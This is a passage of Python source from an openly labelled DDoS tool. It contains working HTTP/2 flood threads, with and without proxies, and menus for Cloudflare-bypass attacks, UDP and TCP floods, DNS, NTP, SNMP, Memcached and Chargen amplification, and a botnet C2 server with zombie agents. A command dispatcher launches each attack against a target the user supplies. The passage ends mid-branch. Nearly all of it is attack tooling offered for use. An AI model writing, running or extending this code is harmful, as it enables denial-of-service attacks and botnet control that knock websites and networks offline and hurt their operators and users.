def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until), daemon=True).start()

def AttackHTTP2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua) if ua else 'Mozilla/5.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(http2=True, timeout=10)
            client.get(url, headers=headers)
            client.get(url, headers=headers)
            client.close()
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackPXHTTP2, args=(url, until), daemon=True).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
        'User-Agent': random.choice(ua) if ua else 'Mozilla/5.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            if proxies:
                proxy = random.choice(proxies)
                client = httpx.Client(
                    http2=True,
                    proxy=f'http://{proxy}',
                    timeout=10
                )
                client.get(url, headers=headers)
                client.get(url, headers=headers)
                client.close()
        except:
            pass

# ═══════════════════════════════════════════════════════════════════════════
# UTILITY / SCREEN
# ═══════════════════════════════════════════════════════════════════════════

def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')

def help():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "  ╦ ╦╔═╗╦  ╔═╗             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "  ╠═╣║╣ ║  ╠═╝             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "  ╩ ╩╚═╝╩═╝╩                \n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "        ══╦═════════════════════════════════╦══\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "layer7   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show Layer7 Methods                    " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "layer4   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show Layer4 Methods                    " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "zombie   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show Zombie/Botnet Commands            " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "tools    " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show tools                             " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "probe    " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Run HTTP diagnostic                    " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "credit   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Show credit                            " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "exit     " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Exit                                   " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")

def credit():
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "Developer " + Fore.RED + ": \x1b[38;2;0;255;189mHyuk / ENI x LO\n")
    stdout.write("\x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "UI Design " + Fore.RED + ": \x1b[38;2;0;255;189mYone / ENI\n")
    stdout.write("\x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "Enhanced  " + Fore.RED + ": \x1b[38;2;0;255;189mENI — UDP Amp + C2 + Yuki-B\n")
    stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n\n")

def layer7():
    clear()
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╔══════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "cfb    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass CF Attack                         " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxcfb  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass CF Attack With Proxy              " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "cfreq  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass CF UAM/CAPTCHA/BFM (request)       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "cfsoc  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Bypass CF UAM/CAPTCHA/BFM (socket)        " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxsky  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Proxy Sky Method                          " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "sky    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Sky method without proxy                  " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "http2  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " HTTP 2.0 Request Attack                   " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxhttp2" + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " HTTP 2.0 Request Attack With Proxy        " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "get    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Get Request Attack                        " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "post   " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Post Request Attack                       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "head   " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Head Request Attack                       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pps    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Only GET / HTTP/1.1                       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "spoof  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " HTTP Spoof Socket Attack                  " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxspoof" + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " HTTP Spoof Socket Attack With Proxy       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "soc    " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Socket Attack                             " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxraw  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Proxy Request Attack                      " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "pxsoc  " + Fore.LIGHTCYAN_EX + " |" + Fore.LIGHTWHITE_EX + " Proxy Socket Attack                       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n\n")

def layer4():
    clear()
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              \n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "udp      " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Enhanced UDP Flood (optimized sockets)       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "dnsamp   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " DNS Amplification Attack                     " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "ntpamp   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " NTP Amplification Attack                     " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "snmpamp  " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " SNMP Amplification Attack                    " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "memcamp  " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Memcached Amplification Attack               " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "chargen  " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Chargen Amplification Attack                 " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "multiudp " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Multi-Vector UDP (all amplification)         " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "yukib    " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " YUKI-B Massive Takedown (all vectors!)       " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "tcp      " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " TCP Flood Attack                             " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n\n")

def zombie_menu():
    clear()
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╦ ╦╔═╗╦ ╦╔═╗╦ ╦╔═╗╦═╗           \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "║║║╠═╣╚╦╝║  ╠═╣║╣ ╠╦╝           \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + "╚╩╝╩ ╩ ╩ ╚═╝╩ ╩╚═╝╩╚═           \n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "c2       " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Start C2 Command Server                     " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "zombie   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Start Zombie Agent (connect to C2)          " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "fetchprox" + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Fetch fresh proxies from all 8 sources      " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n\n")

def tools():
    clear()
    stdout.write("                                 " + Fore.LIGHTWHITE_EX + "╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + " ║ ║ ║║ ║║  ╚═╗             \n")
    stdout.write("                                 " + Fore.LIGHTCYAN_EX + " ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "geoip " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Geo IP Address Lookup                        " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "dns   " + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Classic DNS Lookup                           " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "║ \x1b[38;2;255;20;147m• " + Fore.LIGHTWHITE_EX + "subnet" + Fore.LIGHTCYAN_EX + "|" + Fore.LIGHTWHITE_EX + " Subnet IP Address Lookup                     " + Fore.LIGHTCYAN_EX + "║\n")
    stdout.write("            " + Fore.LIGHTCYAN_EX + "╚═════════════════════════════════════════════════════╝\n\n")

def title():
    stdout.write("\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╔════════════════════════════════════════════════╗\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║         ENHANCED DDoS TOOL — v2.0              ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "║  UDP Amp + C2 Zombies + Yuki-B + 8 Proxy URLs  ║\n")
    stdout.write("             " + Fore.LIGHTCYAN_EX + "╚════════════════════════════════════════════════╝\n\n")

# ═══════════════════════════════════════════════════════════════════════════
# COMMAND DISPATCHER
# ═══════════════════════════════════════════════════════════════════════════

def command():
    stdout.write(Fore.LIGHTCYAN_EX + "╔═══" + Fore.LIGHTCYAN_EX + "[" + Fore.LIGHTGREEN_EX + "root" + Fore.LIGHTCYAN_EX + "@" + Fore.LIGHTCYAN_EX + "DOS" + Fore.CYAN + "]" + Fore.LIGHTCYAN_EX + "\n╚══\x1b[38;2;0;255;189m> " + Fore.WHITE)
    cmd = input()
    
    if cmd in ("cls", "clear"):
        clear()
        title()
    elif cmd in ("help", "?"):
        help()
    elif cmd == "credit":
        credit()
    elif cmd in ("layer7", "LAYER7", "l7", "L7", "Layer7"):
        layer7()
    elif cmd in ("layer4", "LAYER4", "l4", "L4", "Layer4"):
        layer4()
    elif cmd in ("zombie", "ZOMBIE", "botnet"):
        zombie_menu()
    elif cmd in ("tools", "tool"):
        tools()
    elif cmd == "exit":
        exit()
    
    # ─── Layer 7 Commands ───────────────────────────────────────────────────
    elif cmd in ("cfb", "CFB"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif cmd in ("pxcfb", "PXCFB"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXCFB(target, thread, t)
            timer.join()
    elif cmd in ("cfreq", "CFREQ"):
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFPRO(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
    elif cmd in ("cfsoc", "CFSOC"):
        target, thread, t = get_info_l7()
        stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
        if get_cookie(target):
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchCFSOC(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Failed to bypass cf\n")
    elif cmd in ("pxsky", "PXSKY"):
        if get_proxies():
            target, thread, t = get_info_l7()
            threading.Thread(target=attackSKY, args=(target, t, thread), daemon=True).start()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            timer.join()
    elif cmd in ("sky", "SKY"):
        target, thread, t = get_info_l7()
        threading.Thread(target=attackSTELLAR, args=(target, t, thread), daemon=True).start()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    elif cmd in ("http2", "HTTP2"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHTTP2(target, thread, t)
        timer.join()
    elif cmd in ("pxhttp2", "PXHTTP2"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXHTTP2(target, thread, t)
            timer.join()
    elif cmd in ("get", "GET"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif cmd in ("post", "POST"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPOST(target, thread, t)
        timer.join()
    elif cmd in ("head", "HEAD"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchHEAD(target, thread, t)
        timer.join()
    elif cmd in ("pxraw", "PXRAW"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif cmd in ("soc", "SOC"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif cmd in ("pxsoc", "PXSOC"):
        if get_proxies():
            target, thread, t = get_info_l7()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif cmd in ("pps", "PPS"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchPPS(target, thread, t)
        timer.join()
    elif cmd in ("spoof", "SPOOF"):
        target, thread, t = get_info_l7()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSPOOF(target, thread, t)
        timer.join()
    elif cmd in ("pxspoof", "PXSPOOF"):
        target, thread, t = get_info_l7()
        socks5_proxies = get_proxylist("SOCKS5")
        if socks5_proxies:
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSPOOF(target, thread, t, socks5_proxies)
            timer.join()
    
    # ─── Layer 4 Commands ───────────────────────────────────────────────────
    elif cmd in ("udp", "UDP"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_udp_flood(target, port, thread, t)
        timer.join()
    elif cmd in ("dnsamp", "DNSAMP"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_dns_amp(target, port, thread, t)
        timer.join()
    elif cmd in ("ntpamp", "NTPAMP"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_ntp_amp(target, thread, t)
        timer.join()
    elif cmd in ("snmpamp", "SNMPAMP"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_snmp_amp(target, thread, t)
        timer.join()
    elif cmd in ("memcamp", "MEMCAMP"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_memc_amp(target, thread, t)
        timer.join()
    elif cmd in ("chargen", "CHARGEN"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_chargen_amp(target, thread, t)
        timer.join()
    elif cmd in ("multiudp", "MULTIUDP"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_multi_udp(target, port, thread, t)
        timer.join()
    elif cmd in ("yukib", "YUKIB", "yuki-b", "YUKI-B"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_yuki_b(target, port, thread, t)
        timer.join()
    elif cmd in ("tcp", "TCP"):
        target, port, thread, t = get_info_l4()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        run_tcp_flood(target, port, thread, t)
        timer.join()
    
    # ─── Zombie / C2 Commands ──────────────────────────────────────────────
    elif cmd in ("c2", "C2"):
        start_c2_server()
    elif cmd in ("zombie", "ZOMBIE"):
        start_zombie_agent()
    elif cmd in ("fetchprox", "FETCHPROX", "refreshprox"):
        get_proxylist("HTTP")
        stdout.write(Fore.LIGHTGREEN_EX + " [*] " + Fore.WHITE + "Proxies refreshed.\n")
    
    # ─── Tools ─────────────────────────────────────────────────────────────
    elif cmd == "probe":
        probe()
    elif cmd == "subnet":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif cmd == "dns":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP/DOMAIN " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    elif cmd == "geoip":
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "IP " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
        target = input()
        try:
            r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
            print(r.text)
        except:
            print('An error has occurred while sending the request to the API!')
    else:
        stdout.write(Fore.MAGENTA + " [>] " + Fore.WHITE + "Unknown command. type 'help' to see all commands.\n")

# ═══════════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    init(convert=True)
    
    # Load user agents
    if os.path.exists('./resources/ua.txt'):
        with open('./resources/ua.txt', 'r') as f:
            ua = f.read().split('\n')
    if not ua:
        ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        ]
    
    if len(sys.argv) < 2:
        # Interactive CLI mode
        clear()
        title()
        while True:
            command()
    elif len(sys.argv) == 5:
        # Command-line argument mode: python3 main.py <method> <target> <thread> <time>
        method = sys.argv[1].rstrip()
        target = sys.argv[2].rstrip()
        thread = sys.argv[3].rstrip()
        t = sys.argv[4].rstrip()
        
        stdout.write(f"\n {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Method: {method}\n")
        stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Target: {target}\n")
        stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Threads: {thread}\n")
        stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Duration: {t}s\n\n")
        
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        
        # Layer 7 methods
        if method == "cfb":
            LaunchCFB(target, thread, t)
        elif method == "pxcfb":
            if get_proxies():
                LaunchPXCFB(target, thread, t)
        elif method == "cfreq":
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
            if get_cookie(target):
                LaunchCFPRO(target, thread, t)
        elif method == "cfsoc":
            stdout.write(Fore.MAGENTA + " [*] " + Fore.WHITE + "Bypassing CF... (Max 60s)\n")
            if get_cookie(target):
                LaunchCFSOC(target, thread, t)
        elif method == "get":
            LaunchRAW(target, thread, t)
        elif method == "post":
            LaunchPOST(target, thread, t)
        elif method == "head":
            LaunchHEAD(target, thread, t)
        elif method == "pxraw":
            if get_proxies():
                LaunchPXRAW(target, thread, t)
        elif method == "soc":
            LaunchSOC(target, thread, t)
        elif method == "pxsoc":
            if get_proxies():
                LaunchPXSOC(target, thread, t)
        elif method == "http2":
            LaunchHTTP2(target, thread, t)
        elif method == "pxhttp2":
            if get_proxies():
                LaunchPXHTTP2(target, thread, t)
        elif method == "pxsky":
            if get_proxies():
                attackSKY(target, t, thread)
        elif method == "sky":
            attackSTELLAR(target, t, thread)
        
        # Layer 4 methods
        elif method == "udp":
            # For CLI mode, default port 80 if not specified in target
            if ':' in target:
                ip, port = target.split(':')
            else:
                ip, port = target, "80"
            run_udp_flood(ip, port, thread, t)
        elif method == "tcp":
            if ':' in target:
                ip, port = target.split(':')
            else:
                ip, port = target, "80"
            run_tcp_flood(ip, port, thread, t)
        elif method == "dnsamp":
            if ':' in target:
